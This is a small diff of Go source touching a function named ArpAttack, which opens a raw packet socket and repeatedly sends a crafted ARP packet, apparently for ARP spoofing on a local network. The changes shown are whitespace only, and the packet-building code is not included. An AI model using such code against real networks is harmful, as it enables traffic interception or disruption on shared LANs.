@@ -74,13 +74,13 @@ func ArpAttack() {
 	addr.Protocol = syscall.ETH_P_ARP
 	addr.Ifindex = interf.Index
 	addr.Hatype = syscall.ARPHRD_ETHER
-
 	fd, err := syscall.Socket(syscall.AF_PACKET, syscall.SOCK_RAW, syscall.ETH_P_ALL)
 	if err != nil {
 		fmt.Println("Error: " + err.Error())
 		return
 	}
 	defer syscall.Close(fd)
+	
 	arpPacket := createArpPacket()
 	packet := C.GoBytes(unsafe.Pointer(&arpPacket), C.int(60))
 	i := 1
@@ -95,7 +95,6 @@ func ArpAttack() {
 		}
 		time.Sleep(1000 * time.Millisecond)
 		i++
-
 		if i > 120 {
 			break
 		}
